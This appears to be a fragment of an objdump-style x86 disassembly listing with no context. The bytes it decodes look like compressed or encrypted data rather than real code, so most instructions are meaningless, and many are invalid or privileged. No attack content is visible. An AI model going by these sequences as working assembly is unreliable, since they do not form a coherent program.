  418c0f:	add    ch,BYTE PTR [esi+0x30bad6fa]
  418c15:	cmp    BYTE PTR [ecx+0x32],bl
  418c18:	data16 jb 0x418ba2
  418c1b:	fidiv  WORD PTR [ecx+0x30]
  418c1e:	inc    ebx
  418c1f:	enter  0xedc3,0x21
  418c23:	inc    esp
  418c24:	xlat   BYTE PTR ds:[ebx]
  418c25:	retf   0x495e
  418c28:	(bad)  
  418c29:	push   edi
  418c2a:	lds    eax,FWORD PTR [esi+0x57]
  418c2d:	xchg   esi,eax
  418c2e:	fld    TBYTE PTR [ebp-0x39]
  418c31:	stos   DWORD PTR es:[edi],eax
  418c32:	out    dx,eax
  418c33:	neg    DWORD PTR [eax]
  418c35:	mov    ebp,edi
  418c37:	fmul   st,st(4)
  418c39:	das    
  418c3a:	and    cl,bh
  418c3c:	pop    ebp
  418c3d:	dec    edi
  418c3e:	into   
  418c3f:	sbb    DWORD PTR [esi-0x60726564],esi
  418c45:	cmc    
  418c46:	mov    esp,0x662ed4c2
  418c4b:	das    
  418c4c:	push   ecx
  418c4d:	sbb    esp,DWORD PTR [esp+ecx*4]
  418c50:	aaa    
  418c51:	pop    ebp
  418c52:	popf   
  418c53:	pop    ebp
  418c54:	leave  
  418c55:	sbb    DWORD PTR [edi+0x3c6c6599],0x3c
  418c5c:	jnp    0x418c60
  418c5e:	dec    ecx
  418c5f:	test   eax,0x948d7d7b
  418c64:	adc    al,0xf4
  418c66:	xchg   BYTE PTR [edi-0x58857b12],dl
  418c6c:	(bad)  
  418c6d:	or     BYTE PTR [ebx-0x52b120fa],dh
  418c73:	inc    edi
  418c74:	xor    DWORD PTR [edi],esp
  418c76:	stc    
  418c77:	xchg   edx,eax
  418c78:	enter  0x5a91,0x9d
  418c7c:	mov    ah,0xe7
  418c7e:	(bad)  
  418c80:	add    DWORD PTR [eax],ebx
  418c82:	xor    ah,BYTE PTR [ecx]
  418c84:	loope  0x418ced
  418c86:	jns    0x418c0e
  418c88:	mov    edi,DWORD PTR [eax+0x4a1f05f4]
  418c8e:	pop    esp
  418c8f:	sub    esi,DWORD PTR [eax+eax*1+0x0]
	...
  418cf2:	add    BYTE PTR [eax],al
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcr    BYTE PTR [edi-0x42],cl
  418d02:	push   esp
  418d03:	data16 loopne 0x418d0c
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x6c000001
  418d0d:	cmp    BYTE PTR [esi+ebx*8+0x1f],bh
  418d11:	add    eax,0xe71f10ce
  418d16:	cmc    
  418d17:	(bad)  
  418d18:	repz inc eax
  418d1a:	push   edi
  418d1b:	adc    eax,0xe92d2ce0
  418d20:	xchg   esp,eax
  418d21:	jo     0x418cda
  418d23:	cdq    
  418d24:	mov    DWORD PTR [ecx+eiz*2+0x5f],edi
  418d28:	cmp    BYTE PTR [ebx+0x2],dl
  418d2b:	inc    ebp
  418d2c:	pop    ecx
  418d2d:	rol    ah,0xcc
  418d30:	lea    ecx,[eiz*2+0x5d877b47]
  418d37:	sub    BYTE PTR [ebx-0x3a],bh
  418d3a:	neg    ch
  418d3c:	iret   
  418d3d:	arpl   cx,bp
  418d3f:	aad    0x44
  418d41:	mov    ecx,0x6979c2d
  418d46:	add    al,0x50
  418d48:	sub    ebx,DWORD PTR [edi-0x4e289ae7]
  418d4e:	mov    cl,0xb4
  418d50:	das    
  418d51:	mov    eax,ds:0x873f1c40
  418d56:	mov    eax,ds:0xab10be5d
  418d5b:	repz pop ebp
  418d5d:	mov    edi,DWORD PTR [ecx]
  418d5f:	dec    esp
  418d60:	add    eax,0xd38c62d4
  418d65:	ficom  WORD PTR [edi+0x544a552b]
  418d6b:	sub    BYTE PTR [edx],ah
  418d6d:	mov    DWORD PTR [ebp+0x26fcff4e],eax
  418d73:	sar    DWORD PTR [edi+0x5],cl
  418d76:	out    dx,eax
  418d77:	retf   0x3826
  418d7a:	lods   al,BYTE PTR ds:[esi]
  418d7b:	(bad)  
  418d7c:	hlt    
  418d7d:	pop    eax
  418d7e:	imul   edi,edx,0x5711694c
  418d84:	ins    BYTE PTR es:[edi],dx
  418d85:	mov    DWORD PTR [edx],esi
  418d87:	js     0x418d82
  418d89:	popf   
  418d8a:	cmp    al,0x70
  418d8c:	fnstsw WORD PTR [ebx]
  418d8e:	push   eax
  418d8f:	repnz add ecx,edx
  418d92:	cdq    
  418d93:	and    dh,BYTE PTR ds:0x5769f408
  418d99:	sti    
  418d9a:	mov    al,ds:0xb6b8a194
  418d9f:	jae    0x418d82
  418da1:	adc    BYTE PTR [edi],ch
  418da3:	fist   DWORD PTR [ebx-0x22236fe9]
  418da9:	xor    DWORD PTR [edx-0x35],ebp
  418dac:	xor    dl,dh
  418dae:	dec    esi
  418daf:	mov    ebp,0x8d9bfd88
  418db4:	mov    bl,0x9c
  418db6:	pop    edx
  418db7:	inc    esp
  418db8:	push   edx
  418db9:	cmp    DWORD PTR [esi+eiz*2-0x2b11ef4b],edx
  418dc0:	xor    BYTE PTR [eax],bl
  418dc2:	mov    esp,0x592e1b48
  418dc7:	test   DWORD PTR [edx+0x7dc07cee],edx
  418dcd:	(bad)  
  418dcf:	and    DWORD PTR [edx+eax*2+0x3f],0xf5233f80
  418dd7:	call   0xd66b497a
  418ddc:	jle    0x418dd8
  418dde:	pop    edx
  418ddf:	je     0x418d8a
  418de1:	or     edi,edi
  418de3:	das    
  418de4:	add    DWORD PTR [ebx+ebp*4+0x37994df4],0xffffffdd
  418dec:	in     eax,0x22
  418dee:	push   eax
  418def:	jmp    0xccddc63f
  418df4:	(bad)  [esi-0x3e]
  418df7:	or     DWORD PTR [esi],ecx
  418df9:	(bad)  
  418dfa:	mov    ds:0xb65fc511,eax
  418dff:	mov    ah,0x19
  418e01:	fld    TBYTE PTR [ebx+ebx*2-0x44352a36]
  418e08:	shr    dl,0x6d
  418e0b:	xchg   edx,eax
  418e0c:	mov    dh,0xa9
  418e0e:	hlt    
  418e0f:	add    ebx,DWORD PTR [esi+0x0]
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x73]
  418e81:	aaa    
  418e82:	xchg   ebp,eax
  418e83:	push   ebp
  418e84:	in     eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x56000001
  418e8d:	repnz lahf 
  418e8f:	jge    0x418eb9
  418e91:	sub    DWORD PTR [ecx],ebx
  418e93:	dec    ecx
  418e94:	int    0x8f
  418e96:	cld    
  418e97:	(bad)  
  418e99:	into   
  418e9a:	mov    esi,0x2449c9ec
  418e9f:	and    edi,ebp
  418ea1:	js     0x418e7e
  418ea3:	cli    
  418ea4:	pop    ds
  418ea5:	or     BYTE PTR [ecx+edi*1-0x47],bl
  418ea9:	(bad)  
  418eaa:	stc    
  418eab:	and    eax,0xb6c90a15
  418eb0:	sbb    bl,BYTE PTR [esi+0x51]
  418eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eb4:	mov    ebp,edx
  418eb6:	out    0x53,eax
  418eb8:	push   ecx
  418eb9:	cvtpi2ps xmm2,mm7
  418ebc:	fucomi st,st(6)
  418ebe:	pop    esp
  418ebf:	loope  0x418e6d
  418ec1:	pop    esp
  418ec2:	dec    edx
  418ec3:	iret   
  418ec4:	xchg   ecx,esi
  418ec6:	test   al,0x4c
  418ec8:	pop    esi
  418ec9:	dec    ecx
  418eca:	in     eax,dx
  418ecb:	lods   eax,DWORD PTR ds:[esi]
  418ecc:	mov    ds:0x5e68696,al
  418ed1:	xchg   edx,eax
  418ed2:	mov    eax,DWORD PTR [ecx-0x2cac2b68]
  418ed8:	jmp    0x418eac
  418eda:	add    DWORD PTR [ecx],edi
  418edc:	inc    edx
  418edd:	sbb    DWORD PTR [eax+ecx*4+0x7d82812],ebp
  418ee4:	scas   eax,DWORD PTR es:[edi]
  418ee5:	pop    ss
  418ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee7:	pop    ebp
  418ee8:	inc    esp
  418ee9:	int    0xf9
  418eeb:	cmp    al,cl
  418eed:	cmp    BYTE PTR [ebx+0x21],al
  418ef0:	jbe    0x418f0e
  418ef2:	imul   edi,DWORD PTR [ebp-0x11aeac1d],0x4631db38
  418efc:	mov    ds:0x95085406,eax
  418f01:	push   eax
  418f02:	jmp    0x418ead
  418f04:	enter  0xd88f,0xcb
  418f08:	test   BYTE PTR [edx],0x5e
  418f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f0c:	mov    DWORD PTR [eax-0x2],esi
  418f0f:	push   0xffffffe7
  418f11:	leave  
  418f12:	dec    edi
  418f13:	stos   DWORD PTR es:[edi],eax
  418f14:	mov    esp,0xbd4624c6
  418f19:	fidiv  WORD PTR gs:[edx-0x41]
  418f1d:	imul   edi,edi,0xca29bd7
  418f23:	cmp    eax,0xac31617
  418f28:	jmp    0xe817f04f
  418f2d:	push   esi
  418f2e:	hlt    
  418f2f:	mov    eax,0xdf0fff2a
  418f34:	ds daa 
  418f36:	(bad)  
  418f37:	in     al,dx
  418f38:	push   cs
  418f39:	pop    ebx
  418f3a:	or     DWORD PTR [esp+eiz*4-0x688f28de],ebx
  418f41:	loope  0x418f50
  418f43:	or     eax,0x4b9df46d
  418f48:	pop    es
  418f49:	cmp    eax,0x88b39e65
  418f4e:	inc    edi
  418f4f:	jo     0x418f85
  418f51:	fwait
  418f52:	sbb    al,0x12
  418f54:	retf   0x284f
  418f57:	ss mov dh,0x6c
  418f5a:	into   
  418f5b:	cld    
  418f5c:	cmp    bl,dh
  418f5e:	leave  
  418f5f:	mov    ds:0x8d9b34c6,al
  418f64:	pop    es
  418f65:	(bad)  
  418f66:	jle    0x418fce
  418f68:	std    
  418f69:	pop    ebx
  418f6a:	pop    edi
  418f6b:	rol    DWORD PTR [ebx],cl
  418f6d:	cmp    dl,BYTE PTR [edi-0x4b]
  418f70:	or     ch,ch
  418f72:	sub    eax,0x4dc2545f
  418f77:	push   ebp
  418f78:	mov    BYTE PTR [esi+0x5d54c03a],bl
  418f7e:	add    eax,0x764f8cdb
  418f83:	sub    DWORD PTR [ebx-0x4c],eax
  418f86:	mov    ebx,DWORD PTR [edx]
  418f88:	jno    0x418f4f
  418f8a:	xor    DWORD PTR [ebx-0x6a886cac],eax
  418f90:	xlat   BYTE PTR ds:[ebx]
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x66eaf1a7]
  419001:	mov    ds:0x8eaae2f,eax
  419006:	add    DWORD PTR [eax],eax
  419008:	add    eax,0x32000001
  41900d:	imul   edx,DWORD PTR [edx+0xfe328f1],0xcfe22a6
  419017:	sbb    edi,edx
  419019:	retf   0xc520
  41901c:	call   0xd5da:0x1cbd048d
  419023:	in     eax,dx
  419024:	cs dec ecx
  419026:	pop    ecx
  419027:	enter  0xa10b,0xe0
  41902b:	cmpxchg ah,al
  41902e:	sbb    eax,0x72b94493
  419033:	cdq    
  419034:	or     bh,BYTE PTR [edi-0x38d96a23]
  41903a:	sub    eax,0xcc50122b
  41903f:	mov    edx,0xb3d9922
  419044:	adc    dh,BYTE PTR [ebp+0x5c]
  419047:	cdq    
  419048:	call   0x1ec7855d
  41904d:	xor    ecx,DWORD PTR [esi]
  41904f:	push   edi
  419050:	or     DWORD PTR [esi+0x235a4f63],ecx
  419056:	mov    ah,0x6c
  419058:	stos   BYTE PTR es:[edi],al
  419059:	jbe    0x418ffd
  41905b:	sub    DWORD PTR [edi-0x7f],ecx
  41905e:	aas    
  41905f:	and    BYTE PTR [eax+0x2e],al
  419062:	inc    ebx
  419063:	test   eax,0x42a88fc6
  419068:	xor    eax,0xcc28d8c1
  41906d:	mov    ch,0x41
  41906f:	fs mov ecx,0x331e2085
  419075:	xor    DWORD PTR ds:0x6e25400a,ebp
  41907b:	not    BYTE PTR [ecx]
  41907d:	pop    esi
  41907e:	jg     0x419060
  419080:	ja     0x4190ef
  419082:	ins    DWORD PTR es:[edi],dx
  419083:	sti    
  419084:	dec    ecx
  419085:	inc    ebp
  419086:	enter  0xf2e2,0xfd
  41908a:	mov    ecx,ebp
  41908c:	jge    0x4190e5
  41908e:	out    0x76,eax
  419090:	cmp    BYTE PTR [esi-0x3],cl
  419093:	ins    DWORD PTR es:[edi],dx
  419094:	loopne 0x4190c7
  419096:	lods   al,BYTE PTR ds:[esi]
  419097:	cli    
  419098:	sbb    al,0x85
  41909a:	jecxz  0x41905f
  41909c:	nop
  41909d:	sub    DWORD PTR [edx-0x8],esp
  4190a0:	in     eax,0xcc
  4190a2:	lahf   
  4190a3:	pop    ebp
  4190a4:	int3   
  4190a5:	je     0x419125
  4190a7:	(bad)  
  4190a9:	ins    DWORD PTR es:[edi],dx
  4190aa:	ret    
  4190ab:	invd   
  4190ad:	clc    
  4190ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190af:	fwait
  4190b0:	stos   DWORD PTR es:[edi],eax
  4190b1:	cmp    BYTE PTR [ebp+0x6a],ch
  4190b4:	in     al,0xe
  4190b6:	bound  edi,QWORD PTR [ebp*4+0x1b77bba2]
  4190bd:	sub    eax,0x33599cfa
  4190c2:	jecxz  0x41912e
  4190c4:	xor    DWORD PTR [edx-0x67],esi
  4190c7:	push   esi
  4190c8:	jae    0x419146
  4190ca:	xchg   edi,eax
  4190cb:	ja     0x419149
  4190cd:	pop    ebp
  4190ce:	js     0x4190b1
  4190d0:	jbe    0x419063
  4190d2:	stc    
  4190d3:	sti    
  4190d4:	adc    al,0x53
  4190d6:	sbb    ah,BYTE PTR [ebx]
  4190d8:	mov    ecx,0x436a7a82
  4190dd:	fs out 0xbe,eax
  4190e0:	pop    ebx
  4190e1:	inc    edi
  4190e2:	xor    eax,0xd1e21a20
  4190e7:	rcr    BYTE PTR [esi+0x3eb966d7],cl
  4190ed:	(bad)  
  4190ee:	cmp    ebp,esi
  4190f0:	ins    DWORD PTR es:[edi],dx
  4190f1:	sbb    eax,0xfd311bb7
  4190f6:	mov    eax,ds:0x907ddd0d
  4190fb:	fisttp WORD PTR [ecx+ebp*1+0x36]
  4190ff:	iret   
  419100:	or     ebp,DWORD PTR [ebx-0x6716abd5]
  419106:	and    cl,dh
  419108:	add    eax,0xbb3345fd
  41910d:	push   0xffffff89
  41910f:	addr16 clc 
	...
  419171:	add    BYTE PTR [eax],al
  419173:	add    BYTE PTR [edi-0x41bd617b],ch
  419179:	pop    ebx
  41917a:	(bad)  
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ch,BYTE PTR [esi]
  419181:	mov    esi,DWORD PTR [ebx]
  419183:	int    0xef
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0xd8000001,al
  41918d:	fnstcw WORD PTR [ebx]
  41918f:	ins    BYTE PTR es:[edi],dx
  419190:	mov    ah,0x75
  419192:	mov    ds:0xb40b4c62,al
  419197:	sbb    DWORD PTR [eax-0x63d70810],ebp
  41919d:	and    BYTE PTR [ebx+0x4c],0xae
  4191a1:	dec    eax
  4191a2:	out    dx,eax
  4191a3:	dec    edx
  4191a4:	jle    0x419144
  4191a6:	arpl   WORD PTR [ecx+0x64],di
  4191a9:	or     eax,DWORD PTR [eax+0x53]
  4191ac:	mov    bl,0xc6
  4191ae:	mov    eax,ds:0x4b473062
  4191b3:	add    eax,0x3c7885eb
  4191b8:	std    
  4191b9:	test   DWORD PTR [eax],ebp
  4191bb:	add    al,BYTE PTR [ecx+0x770261b9]
  4191c1:	(bad)  
  4191c2:	fisub  WORD PTR [eax-0x6169b8df]
  4191c8:	jle    0x41919c
  4191ca:	cmp    al,0x29
  4191cc:	addr16 pop ss
  4191ce:	cmp    ah,cl
  4191d0:	jmp    0xe205572a
  4191d5:	nop
  4191d6:	adc    edi,eax
  4191d8:	xchg   esp,eax
  4191d9:	mov    ebx,DWORD PTR [ebx-0x27fc6011]
  4191df:	stos   BYTE PTR es:[edi],al
  4191e0:	js     0x4191e6
  4191e2:	pop    eax
  4191e3:	mov    edx,0xfe3f76df
  4191e8:	mov    dh,0xb9
  4191ea:	dec    eax
  4191eb:	push   ebx
  4191ec:	(bad)  [edi+0x6952fa44]
  4191f2:	inc    ebx
  4191f3:	sub    BYTE PTR [edx*2-0x6dfe6fc7],dh
  4191fa:	mov    edx,0xa32f3d7f
  4191ff:	std    
  419200:	(bad)  [esi-0x365555ee]
  419206:	jl     0x419219
  419208:	push   es
  419209:	stc    
  41920a:	fist   WORD PTR [ecx-0x55b723b9]
  419210:	cmp    ebp,esi
  419212:	cdq    
  419213:	in     eax,0x1b
  419215:	push   ss
  419216:	rcl    BYTE PTR [eax],0x92
  419219:	adc    ebp,DWORD PTR [ebp-0x2a]
  41921c:	or     al,0xd0
  41921e:	pop    ds
  41921f:	mov    esi,0xd81fba0a
  419224:	jl     0x4191a8
  419226:	sbb    al,0x75
  419228:	sub    eax,0xdf9d799d
  41922d:	into   
  41922e:	pop    ss
  41922f:	data16 lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419232:	cmc    
  419233:	inc    BYTE PTR [edi+ebp*1+0x4af88c9e]
  41923a:	jmp    0xe28e:0x510c793
  419241:	push   0x1c
  419243:	mov    bh,BYTE PTR [edx-0x4a0ea6b8]
  419249:	push   ebp
  41924a:	or     DWORD PTR [ebx-0x472acbf2],edx
  419250:	dec    esp
  419251:	mov    BYTE PTR [edx-0x24],bh
  419254:	jae    0x419262
  419256:	retf   
  419257:	mov    eax,0x750de8b4
  41925c:	inc    edi
  41925d:	mov    dl,0x51
  41925f:	sub    al,bh
  419261:	cmp    ch,0x72
  419264:	ss mov edi,0x8132ad66
  41926a:	xchg   BYTE PTR [eax+0x7c],cl
  41926d:	jno    0x41924c
  41926f:	mov    ch,0x8d
  419271:	repnz sub eax,0x7dbcdba7
  419277:	push   ss
  419278:	les    ecx,FWORD PTR [eax-0x63f9848]
  41927e:	pop    edi
  41927f:	dec    edx
  419280:	pop    es
  419281:	les    ecx,FWORD PTR ds:0xbe1a396a
  419287:	test   DWORD PTR [ebx+ecx*2],edi
  41928a:	jbe    0x41921f
  41928c:	dec    esi
  41928d:	and    bl,ch
  41928f:	scas   al,BYTE PTR es:[edi]
  419290:	mov    BYTE PTR [eax],0x0
	...
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	leave  
  419301:	pusha  
  419302:	mov    eax,ds:0x10af40f
  419307:	add    BYTE PTR ds:0x8a000001,al
  41930d:	neg    al
  41930f:	call   0xf29b:0x66a44c45
  419316:	jno    0x419330
  419318:	jno    0x4192f2
  41931a:	and    BYTE PTR [eax],bh
  41931c:	or     BYTE PTR [ecx-0x5],bl
  41931f:	retf   
  419320:	fdivr  QWORD PTR [esi+ebp*1-0x14]
  419324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419325:	xchg   edx,eax
  419326:	sub    DWORD PTR [esi-0x6e],esi
  419329:	shl    DWORD PTR [esi+ebp*1-0x58b028ee],1
  419330:	jae    0x41939a
  419332:	push   esp
  419333:	and    ch,BYTE PTR [edi]
  419335:	in     al,0xbc
  419337:	movd   mm5,DWORD PTR [eax-0x597c19e0]
  41933e:	xor    al,0x55
  419340:	in     eax,dx
  419341:	repnz dec edi
  419343:	dec    edx
  419344:	mov    ah,0xd0
  419346:	out    dx,eax
  419347:	jne    0x419353
  419349:	shl    BYTE PTR [ecx+0x29],0xdc
  41934d:	sbb    DWORD PTR [eax-0x57],0x32bc715b
  419354:	inc    ebp
  419355:	ror    DWORD PTR [edx-0x7c],0x45
  419359:	pop    edi
  41935a:	shl    cl,cl
  41935c:	sbb    edx,ecx
  41935e:	jge    0x419345
  419360:	(bad)  
  419361:	in     eax,dx
  419362:	jecxz  0x4193d4
  419364:	imul   edx,ebp,0xffffffc0
  419367:	cs xchg esp,eax
  419369:	pop    ecx
  41936a:	test   bl,0x69
  41936d:	push   ss
  41936e:	inc    ecx
  41936f:	push   esp
  419370:	outs   dx,BYTE PTR ds:[esi]
  419371:	cdq    
  419372:	push   ebp
  419373:	mov    edi,0x2c638394
  419378:	pop    ebp
  419379:	test   al,0x15
  41937b:	neg    BYTE PTR [edi]
  41937d:	fcmovnbe st,st(1)
  41937f:	pushf  
  419380:	outs   dx,BYTE PTR ds:[esi]
  419381:	fs mov eax,0x94e92444
  419387:	mov    ebx,0xed133973
  41938c:	adc    ch,bh
  41938e:	mov    edx,0x9b910c38
  419393:	scas   al,BYTE PTR es:[edi]
  419394:	push   ebp
  419395:	daa    
  419396:	mov    gs,esi
  419398:	test   ebx,esi
  41939a:	and    eax,0xd4648bc9
  41939f:	mov    edx,0x20890a57
  4193a4:	mov    bh,0xc4
  4193a6:	cwde   
  4193a7:	cmc    
  4193a8:	jo     0x4193c1
  4193aa:	or     al,0x62
  4193ac:	ja     0x419349
  4193ae:	imul   ebp,DWORD PTR [esi-0x5ec8e2f8],0xfffffff8
  4193b5:	lods   al,BYTE PTR ds:[esi]
  4193b6:	adc    al,BYTE PTR [ecx+ebp*2-0x310f0608]
  4193bd:	and    bl,BYTE PTR [eax+0x6c]
  4193c0:	mov    BYTE PTR [ebx],al
  4193c2:	loop   0x419347
  4193c4:	sub    bh,BYTE PTR [eax-0xb]
  4193c7:	or     ebp,edi
  4193c9:	fisttp QWORD PTR [ecx+0x8baaf1e]
  4193cf:	cmp    eax,0xcba88dd3
  4193d4:	ins    DWORD PTR es:[edi],dx
  4193d5:	out    dx,al
  4193d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193d7:	mov    BYTE PTR [esi+0x169846ca],bl
  4193dd:	sub    bl,bh
  4193df:	and    eax,DWORD PTR [edi+0x33a2b99f]
  4193e5:	inc    edx
  4193e6:	test   al,0x70
  4193e8:	sub    al,0x61
  4193ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193eb:	xor    ch,BYTE PTR [ebx+0x6cd5faed]
  4193f1:	cmp    al,0x89
  4193f3:	sbb    esi,DWORD PTR [eax]
  4193f5:	aam    0x30
  4193f7:	cmp    al,BYTE PTR es:[edx-0xe6310aa]
  4193fe:	add    BYTE PTR [esi],0xb
  419401:	mov    cl,0x24
  419403:	out    dx,al
  419404:	jecxz  0x419427
  419406:	push   es
  419407:	aas    
  419408:	dec    esp
  419409:	dec    eax
  41940a:	sub    edi,esi
  41940c:	cmp    eax,0x79cea57e
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	xor    dh,dh
  419482:	xchg   edi,eax
  419483:	(bad)  
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0x73000001,al
  41948d:	scas   eax,DWORD PTR es:[edi]
  41948e:	pop    esi
  41948f:	mov    ?,WORD PTR [eax]
  419491:	stos   DWORD PTR es:[edi],eax
  419492:	add    DWORD PTR [ebp-0x78],0xffffffdc
  419496:	adc    bh,ah
  419498:	or     ebx,DWORD PTR [edx*4+0x500e6ada]
  41949f:	xlat   BYTE PTR ds:[ebx]
  4194a0:	cli    
  4194a1:	mov    esp,0xcb2210d
  4194a6:	inc    ebx
  4194a7:	repnz or cl,BYTE PTR [esi-0x3a2b2d55]
  4194ae:	scas   al,BYTE PTR es:[edi]
  4194af:	out    0x92,eax
  4194b1:	mov    esi,0xb0ba33e1
  4194b6:	and    eax,0x3d20bebf
  4194bb:	fistp  WORD PTR [edi+eiz*4+0x58]
  4194bf:	sbb    ecx,DWORD PTR [eax]
  4194c1:	jae    0x419500
  4194c3:	or     BYTE PTR [esi+0x69],al
  4194c6:	shr    al,1
  4194c8:	dec    ecx
  4194c9:	adc    BYTE PTR [ebx],dh
  4194cb:	sub    ah,dh
  4194cd:	jg     0x41944f
  4194cf:	fisubr WORD PTR ds:0x8d5aba0c
  4194d5:	inc    ebp
  4194d6:	int3   
  4194d7:	xor    edx,DWORD PTR [ebp+0x7d75cafb]
  4194dd:	add    dh,al
  4194df:	fidiv  WORD PTR [ecx]
  4194e1:	(bad)  
  4194e2:	clc    
  4194e3:	sbb    eax,0x450da5c8
  4194e8:	lds    edi,FWORD PTR [edx+0x7b535589]
  4194ee:	or     edx,edx
  4194f0:	dec    esi
  4194f1:	mov    cl,0x32
  4194f3:	pop    ebp
  4194f4:	ds push cs
  4194f6:	jecxz  0x4194c1
  4194f8:	out    0x26,al
  4194fa:	lahf   
  4194fb:	sahf   
  4194fc:	jg     0x4194aa
  4194fe:	push   esp
  4194ff:	stos   DWORD PTR es:[edi],eax
  419500:	scas   al,BYTE PTR es:[edi]
  419501:	jp     0x4194d7
  419503:	push   eax
  419504:	hlt    
  419505:	gs loop 0x419569
  419508:	arpl   WORD PTR [edi],dx
  41950a:	jns    0x419562
  41950c:	cmova  eax,DWORD PTR [ebx-0x77]
  419510:	adc    eax,esi
  419512:	pop    eax
  419513:	mov    al,0xb1
  419515:	(bad)  
  419516:	cdq    
  419517:	scas   eax,DWORD PTR es:[edi]
  419518:	adc    cl,BYTE PTR [esi-0x2c7420a1]
  41951e:	cmp    BYTE PTR [esi+0x1e2e501a],bh
  419524:	cmp    eax,0xffffffb7
  419527:	leave  
  419528:	std    
  419529:	(bad)  
  41952a:	jp     0x419530
  41952c:	xchg   edi,eax
  41952d:	sbb    eax,0x5e67597f
  419532:	xor    eax,ebp
  419534:	mov    cl,0xc9
  419536:	popf   
  419537:	inc    esp
  419538:	(bad)  
  419539:	cmp    DWORD PTR [esi],edi
  41953b:	out    0x82,al
  41953d:	mov    edi,0xf0c33c13
  419542:	mov    dh,0x4a
  419544:	outs   dx,BYTE PTR ds:[esi]
  419545:	push   esi
  419546:	jmp    0x21a4:0xacf97c7
  41954d:	jne    0x4194f6
  41954f:	sbb    cl,BYTE PTR [ecx]
  419551:	jb     0x4194e4
  419553:	sbb    bl,ch
  419555:	pop    eax
  419556:	push   ds
  419557:	in     al,0x4b
  419559:	jge    0x41950f
  41955b:	lds    edi,FWORD PTR [edx-0x42]
  41955e:	add    esp,DWORD PTR [ebx]
  419560:	push   esp
  419561:	push   esp
  419562:	hlt    
  419563:	ins    DWORD PTR es:[edi],dx
  419564:	mov    ch,0xb2
  419566:	jmp    0x757a:0x35f7eb7
  41956d:	imul   esi,DWORD PTR [ebp-0x756a65f8],0x42
  419574:	loop   0x419502
  419576:	sub    al,0xc3
  419578:	pop    ebx
  419579:	xor    DWORD PTR [eax+0x2d],eax
  41957c:	inc    edi
  41957d:	push   ebx
  41957e:	cmp    esi,ebp
  419580:	in     al,0xfc
  419582:	out    dx,al
  419583:	daa    
  419584:	push   esp
  419585:	jnp    0x419585
  419587:	jae    0x41958a
  419589:	sub    ebp,DWORD PTR [edx]
  41958b:	sbb    ah,BYTE PTR [edi-0x5670b0d8]
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	add    esp,DWORD PTR [esi-0x75]
  419603:	mov    esp,0x10cfe
  419608:	add    eax,0x10000001
  41960d:	mov    al,bh
  41960f:	ficom  WORD PTR [ecx+0x5772816f]
  419615:	icebp  
  419616:	leave  
  419617:	xchg   ecx,eax
  419618:	inc    esp
  419619:	jns    0x41959e
  41961b:	shl    DWORD PTR [edx-0x5b],cl
  41961e:	adc    dl,cl
  419620:	mov    edx,fs
  419622:	call   0x6dfc5cad
  419627:	imul   edx,DWORD PTR [esi+0x28],0x47
  41962b:	and    ecx,DWORD PTR [ecx]
  41962d:	jmp    0x5299:0xe792770
  419634:	stc    
  419635:	cmp    BYTE PTR [ebp-0x41199874],al
  41963b:	xor    bl,BYTE PTR gs:[esi-0x6a]
  41963f:	push   0x7de2d0e8
  419644:	push   ecx
  419645:	xchg   esp,eax
  419646:	stos   DWORD PTR es:[edi],eax
  419647:	add    eax,0xea1f018b
  41964c:	mov    ds:0x297b84ae,al
  419651:	repz test BYTE PTR [ecx+0x57],0x68
  419656:	mov    ds:0x5f33e605,al
  41965b:	push   edx
  41965c:	out    0x16,al
  41965e:	pop    DWORD PTR [ebx+0x56]
  419661:	xchg   ebp,eax
  419662:	pop    edx
  419663:	pop    ebx
  419664:	pushf  
  419665:	not    BYTE PTR [eax+eiz*1]
  419668:	lods   al,BYTE PTR ds:[esi]
  419669:	shr    ebx,0x2
  41966c:	push   cs
  41966d:	dec    edi
  41966e:	leave  
  41966f:	dec    ebp
  419670:	pop    edi
  419671:	mov    cl,BYTE PTR [ecx]
  419673:	sbb    DWORD PTR [esi+esi*4],edi
  419676:	pop    ebp
  419677:	jne    0x4196d2
  419679:	dec    eax
  41967a:	jmp    0xc454:0xe2ddb9bb
  419681:	jmp    0x419624
  419683:	ror    DWORD PTR [ebx],1
  419685:	pop    ds
  419686:	dec    ebp
  419687:	push   ebx
  419688:	and    eax,0xd3e57f74
  41968d:	jle    0x41962d
  41968f:	imul   ebp,ebx,0x6f
  419692:	dec    ebx
  419693:	push   edx
  419694:	dec    edx
  419695:	pop    edi
